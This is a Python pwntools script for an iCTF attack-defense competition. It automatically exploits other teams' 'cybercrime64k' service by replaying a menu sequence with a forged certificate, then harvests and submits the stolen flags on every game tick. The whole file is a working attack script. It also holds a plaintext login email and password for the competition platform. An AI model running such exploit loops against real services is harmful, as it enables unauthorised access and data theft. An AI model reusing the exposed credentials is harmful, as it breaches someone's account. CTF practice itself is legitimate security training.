from pwn import *
import time
from ictf import iCTF
i = iCTF()
#context.log_level = 'DEBUG'

team = i.login('nmg355@nyu.edu', 'HZBrKynG4XAMvWPa')

cert = """,----------------------------------------.
       |                                        |
       |    0C14BFAA4C765EC87157B6E4AB9AD9B7    |
       |    016517813E744C37CB36062EE5AC4C7A    |
       |    EEABE9392AC56E741C1DCE7A587B5DF8    |
       |    7C534922E01572A20C1FD17E614D060F    |
       |    016A53123E551BBF3133024C0CA885F2    |
       |    92A0F9DAE7579C15BF6BF390FB077B9C    |
       |    0A96543FF04AAA9B0C10D3560717F3B1    |
       |    E8809B1BC33475BCBEBEADCA4BDDEB76    |
       |                                        |
       `----------------------------------------
"""


def exploit(t):
    with remote(t['hostname'], t['port'], timeout=3) as r:
        r.sendline('4')
        r.sendline('1')
        r.sendline(t['flag_id'])
        r.sendline('2')
        r.sendline('2')
        r.sendline('3')
        r.sendline(cert)
        r.sendline("\n\n\n")
        k = r.recvuntil('FLG')
        x = r.recvline()
        flag = 'FLG' + x.strip()
        print flag
        return flag

while True:
    time.sleep(team.get_tick_info()['approximate_seconds_left'] + 30)
    flags = []
    for t in team.get_targets(service='cybercrime64k')['targets']:
        try:
            f = exploit(t)
        except:
            continue
        if f.startswith('FLG'):
            flags.append(f)
    while True:
        try:
            print team.submit_flag(flags)
            break
        except Exception as e:
            print 'got',e,'retrying in 1s'
            time.sleep(1)
